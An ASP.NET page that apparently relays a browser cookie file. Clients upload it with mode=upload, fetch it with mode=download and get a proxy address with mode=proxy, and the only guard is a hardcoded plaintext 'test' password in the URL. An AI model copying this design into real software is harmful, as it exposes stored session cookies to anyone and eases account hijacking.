using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class DHR_Browser_Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string cookiePath = this.MapPath("\\App_Data\\DHR_Browser") + "//" + "DHR_Browser_Cookie";


        if (Request.QueryString["pwd"] == null
       || Request.QueryString["pwd"].ToString()
       != "test")
        {
            Response.StatusCode = 403;
            Response.Write("Wrong Password!\r\n");
            Response.End();
        }

        //if (Request.QueryString["pwd"] == null
        //    || GetSpecMD5Hash(Request.QueryString["pwd"].ToString())
        //    != "0948c521e4851983694716a94868c429")
        //{
        //    Response.StatusCode = 403;
        //    Response.Write("Wrong Password!\r\n");
        //    Response.End();
        //}

        if (Request.QueryString["mode"] != null
            &&
            Request.QueryString["mode"].ToString()
            == "download")
        {
            Response.TransmitFile(cookiePath);
            Response.End();
        }

        if (Request.QueryString["mode"] != null
            &&
            Request.QueryString["mode"].ToString()
            == "proxy")
        {
            Response.Write("hoho.im:32808");
            Response.End();
        }

        if (Request.Files.Count > 0 && Request.QueryString["mode"] != null
            &&
            Request.QueryString["mode"].ToString()
            == "upload")
        {
            try
            {
                HttpPostedFile file = Request.Files[0];
                if (!Directory.Exists(this.MapPath("\\App_Data\\DHR_Browser")))
                    Directory.CreateDirectory(this.MapPath("\\App_Data\\DHR_Browser"));
                string filePath = this.MapPath("\\App_Data\\DHR_Browser") + "//" + "DHR_Browser_Cookie";
                file.SaveAs(filePath);
                Response.Write("Success\r\n");
            }
            catch
            {
                Response.Write("Error\r\n");
            }
        }
    }

    public static string GetSpecMD5Hash(string input)
    {
        input = "$#@!#$Qzj" + input + "!@#$%$DASFDAS#!@#";
        System.Security.Cryptography.MD5CryptoServiceProvider x = new System.Security.Cryptography.MD5CryptoServiceProvider();
        byte[] bs = System.Text.Encoding.UTF8.GetBytes(input);
        bs = x.ComputeHash(bs);
        System.Text.StringBuilder s = new System.Text.StringBuilder();
        foreach (byte b in bs)
        {
            s.Append(b.ToString("x2").ToLower());
        }
        string password = s.ToString();
        return password;
    }
}